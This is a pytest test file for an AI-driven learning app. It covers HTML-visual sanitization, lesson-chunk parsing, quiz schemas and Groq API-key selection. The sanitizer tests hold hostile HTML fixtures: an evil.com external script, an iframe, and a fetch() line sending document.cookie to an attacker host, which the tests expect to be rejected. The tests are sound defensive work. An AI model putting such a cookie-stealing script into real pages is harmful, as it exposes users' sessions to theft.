import pytest
from src.api.learn import validate_and_sanitize_visual_html, parse_and_validate_chunks, ExplanationChunk


def test_sanitize_valid_visual_html():
    valid_html = """<!DOCTYPE html>
    <html>
    <head><title>Visual</title></head>
    <body>
      <div id="app">Hello SVG</div>
      <svg><circle cx="50" cy="50" r="40" fill="green" /></svg>
      <script>console.log('Safe inline script');</script>
    </body>
    </html>"""
    is_valid, sanitized = validate_and_sanitize_visual_html(valid_html)
    assert is_valid is True
    assert sanitized is not None
    assert "Content-Security-Policy" in sanitized
    assert "default-src 'none'" in sanitized


def test_sanitize_rejects_external_script_src():
    unsafe_html = """<!DOCTYPE html>
    <html>
    <head><script src="https://evil.com/malicious.js"></script></head>
    <body><div>Test</div></body>
    </html>"""
    is_valid, sanitized = validate_and_sanitize_visual_html(unsafe_html)
    assert is_valid is False
    assert sanitized is None


def test_sanitize_rejects_fetch_and_xhr():
    unsafe_html = """<!DOCTYPE html>
    <html>
    <body>
      <script>
        fetch('https://evil.com/steal-token?cookie=' + document.cookie);
      </script>
    </body>
    </html>"""
    is_valid, sanitized = validate_and_sanitize_visual_html(unsafe_html)
    assert is_valid is False
    assert sanitized is None


def test_sanitize_rejects_nested_iframes():
    unsafe_html = """<!DOCTYPE html>
    <html>
    <body>
      <iframe src="https://evil.com"></iframe>
    </body>
    </html>"""
    is_valid, sanitized = validate_and_sanitize_visual_html(unsafe_html)
    assert is_valid is False
    assert sanitized is None


def test_parse_and_validate_chunks_with_visual():
    ai_json = """{
        "chunks": [
            {
                "title": "Intro Chunk",
                "explanation": "No visual for intro",
                "has_visual": false,
                "visual_html": null
            },
            {
                "title": "Interactive STEM Chunk",
                "explanation": "Newton's force simulation",
                "has_visual": true,
                "visual_html": "<html><head><style>:root { --primary: #2F5233; --surface: #FFFFFF; --ink: #1C2826; }</style></head><body><input type='range' id='f'/><svg><rect width='10' height='10'/></svg><script>const f=document.getElementById('f'); f.addEventListener('input', update); function update(){}</script></body></html>"
            }
        ]
    }"""
    chunks = parse_and_validate_chunks(ai_json)
    assert chunks is not None
    assert len(chunks) == 2
    assert chunks[0]["has_visual"] is False
    assert chunks[0]["visual_html"] is None
    assert chunks[1]["has_visual"] is True
    assert "Content-Security-Policy" in chunks[1]["visual_html"]


def test_quality_check_passes_valid_visual():
    from src.api.learn import validate_visual_quality_check, _MOCK_PHYSICS_VISUAL
    assert validate_visual_quality_check(_MOCK_PHYSICS_VISUAL) is True


def test_quality_check_rejects_missing_range_slider():
    from src.api.learn import validate_visual_quality_check
    no_slider_html = "<html><head><style>:root { --primary: #2F5233; --surface: #FFFFFF; --ink: #1C2826; }</style></head><body><button>Click</button><svg><circle cx='1' cy='1'/></svg><script>function update(){}</script></body></html>"
    assert validate_visual_quality_check(no_slider_html) is False


def test_quality_check_rejects_missing_svg():
    from src.api.learn import validate_visual_quality_check
    no_svg_html = "<html><head><style>:root { --primary: #2F5233; --surface: #FFFFFF; --ink: #1C2826; }</style></head><body><input type='range'/><script>function update(){}</script></body></html>"
    assert validate_visual_quality_check(no_svg_html) is False


def test_quality_check_rejects_missing_js_update():
    from src.api.learn import validate_visual_quality_check
    no_js_html = "<html><head><style>:root { --primary: #2F5233; --surface: #FFFFFF; --ink: #1C2826; }</style></head><body><input type='range'/><svg><circle cx='1' cy='1'/></svg></body></html>"
    assert validate_visual_quality_check(no_js_html) is False


def test_quality_check_rejects_missing_css_tokens():
    from src.api.learn import validate_visual_quality_check
    no_tokens_html = "<html><body><input type='range' id='f'/><svg><rect width='10' height='10'/></svg><script>const f=document.getElementById('f'); f.addEventListener('input', update); function update(){}</script></body></html>"
    assert validate_visual_quality_check(no_tokens_html) is False


def test_quiz_phase_out_and_submit_response_schema_attempt_fields():
    from src.schemas.learn import QuizPhaseOut, QuizQuestionOut, QuizSubmitResponse

    phase_out = QuizPhaseOut(
        phase=1,
        name="Recall",
        description="Recall terms",
        is_unlocked=True,
        is_passed=False,
        questions=[
            QuizQuestionOut(
                id="p1_q1",
                question="Concept question in Hindi?",
                options=["1", "2", "3", "4"],
                chunk_id="chunk_0",
                concept_category="Fundamentals"
            )
        ],
        attempts_count=2,
        max_attempts=3
    )
    assert phase_out.attempts_count == 2
    assert phase_out.max_attempts == 3

    submit_res = QuizSubmitResponse(
        phase=1,
        passed=False,
        score_percent=50.0,
        correct_count=5,
        total_questions=10,
        passing_threshold_percent=70.0,
        next_phase_unlocked=None,
        is_session_completed=False,
        attempts_count=2,
        max_attempts=3,
        can_retry=True,
        details=[]
    )
    assert submit_res.attempts_count == 2
    assert submit_res.can_retry is True


@pytest.mark.asyncio
async def test_call_groq_api_for_single_phase_fallback():
    from src.api.learn import call_groq_api_for_single_phase
    phase_data = await call_groq_api_for_single_phase(
        phase=1,
        video_title="Archimedes Principle",
        explanation_text="Buoyancy force equals weight of displaced fluid.",
        language_name="Hindi (हिंदी)",
        exclude_questions=["What is primary subject?"]
    )
    assert isinstance(phase_data, dict)
    assert "questions" in phase_data
    assert len(phase_data["questions"]) > 0


def test_get_groq_api_key_feature_and_pool():
    from src.config import settings, get_groq_api_key
    old_exp_key = settings.groq_api_key_explanation
    old_pool = settings.groq_api_keys_pool
    try:
        settings.groq_api_key_explanation = "gsk_explanation_account_key"
        assert get_groq_api_key("explanation") == "gsk_explanation_account_key"

        settings.groq_api_key_explanation = ""
        settings.groq_api_keys_pool = "gsk_key1, gsk_key2"
        k1 = get_groq_api_key("quiz")
        k2 = get_groq_api_key("quiz")
        assert k1 in ["gsk_key1", "gsk_key2"]
        assert k2 in ["gsk_key1", "gsk_key2"]
    finally:
        settings.groq_api_key_explanation = old_exp_key
        settings.groq_api_keys_pool = old_pool
